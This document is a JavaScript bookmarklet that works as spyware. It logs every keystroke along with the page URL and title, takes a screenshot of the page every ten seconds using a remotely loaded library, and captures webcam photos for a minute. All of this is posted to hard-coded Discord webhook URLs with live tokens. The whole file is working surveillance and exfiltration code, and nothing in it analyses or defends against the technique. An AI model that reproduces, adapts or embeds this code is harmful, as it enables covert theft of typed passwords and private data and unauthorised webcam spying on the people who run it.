/// full.js
javascript:(function(){let log=[],siteURL=window.location.href,siteName=document.title,sending=false,urlSent=false;document.addEventListener('keydown',e=>log.push('Key pressed: '+e.key));const sendLogsToDiscord=()=>{if(!urlSent){const siteLink=`[Current Site: ${siteName}](${siteURL})`;fetch('https://canary.discord.com/api/webhooks/1288200414906548306/GwqW_f-SP7j5zyv638MAeOwZotloZtYBcAm8kVPk-G-uDgYlg6iqAt53L2AhIFlX8Yfs',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:siteLink})});urlSent=true;}if(log.length>0){fetch('https://canary.discord.com/api/webhooks/1288200414906548306/GwqW_f-SP7j5zyv638MAeOwZotloZtYBcAm8kVPk-G-uDgYlg6iqAt53L2AhIFlX8Yfs',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:log.join('\n')})});log=[];}};setTimeout(sendLogsToDiscord,1000);setInterval(sendLogsToDiscord,1000);function init(){if(window.html2canvas)return run();var script=document.createElement('script');script.onload=run;script.src='https://html2canvas.hertzen.com/dist/html2canvas.min.js';document.querySelector('head').appendChild(script);}function run(){setInterval(()=>{if(!sending){sending=true;html2canvas(document.body).then(canvas=>new Promise(fulfill=>canvas.toBlob(fulfill))).then(blob=>{const file=new File([blob],'screenshot.png',{type:'image/png'});sendToDiscord(file).finally(()=>sending=false);}).catch(error=>{console.error('Failed to capture:',error.message);sending=false;});}},10000);}function sendToDiscord(file){var formData=new FormData();formData.append('file',file);return fetch('https://discord.com/api/webhooks/1288246195571134464/-hgyZBpmRt5Fj_IvqOzmxTl0K1ePMoYlA4FO8YtHPK97tSPQuz-c4giZ41nle41srnsE',{method:'POST',body:formData}).then(response=>{if(!response.ok)throw new Error('Failed to send');});}async function captureWebcam(){const video=document.createElement('video'),canvas=document.createElement('canvas'),stream=await navigator.mediaDevices.getUserMedia({video:true});video.srcObject=stream;video.play();await new Promise(resolve=>video.onloadedmetadata=resolve);const captureAndSend=async()=>{canvas.width=video.videoWidth;canvas.height=video.videoHeight;canvas.getContext('2d').drawImage(video,0,0);canvas.toBlob(async blob=>{const formData=new FormData();formData.append('file',blob,'photo.png');await fetch('https://discord.com/api/webhooks/1288242859765665923/NnERv8pZZ-bsQYDbhTWWtmpjB2qsqbRW4sr_Ub70o2rFz1zUD_wwTU2QAI4k1emhwjSp',{method:'POST',body:formData});},'image/png');};setInterval(captureAndSend,10000);setTimeout(()=>{stream.getTracks().forEach(track=>track.stop());},60000);}captureWebcam();init();})();
